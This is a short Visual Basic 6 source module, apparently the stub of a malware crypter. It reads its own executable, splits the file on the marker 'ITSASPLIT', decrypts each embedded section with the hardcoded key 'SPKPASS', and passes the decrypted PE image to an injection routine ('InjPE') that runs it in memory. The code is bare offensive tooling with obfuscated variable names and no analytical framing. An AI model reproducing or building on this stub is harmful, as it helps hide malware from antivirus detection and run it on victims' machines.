Attribute VB_Name = "min"

Sub Main()
Dim var001 As Integer
Dim a As New Class1
var001 = FreeFile

Dim var002 As String

Open App.Path & "\" & App.EXEName & ".exe" For Binary As #var001

var002 = Space(FileLen(App.Path & "\" & App.EXEName & ".exe"))

Get #var001, , var002

Close #var001

Dim lol As New Class2
Dim var006 As String
Dim var004 As Integer


Dim var003() As String

var003() = Split(var002, "ITSASPLIT")


For var004 = 2 To UBound(var003())

    var006 = lol.DecryptString(var003(var004), "SPKPASS")
    'Call a.sFunction02(StrConv(var006, vbFromUnicode), App.Path & "\" & App.EXEName & ".exe")

    Call a.InjPE(App.Path & "\" & App.EXEName & ".exe", StrConv(var006, vbFromUnicode))

Next var004



End Sub
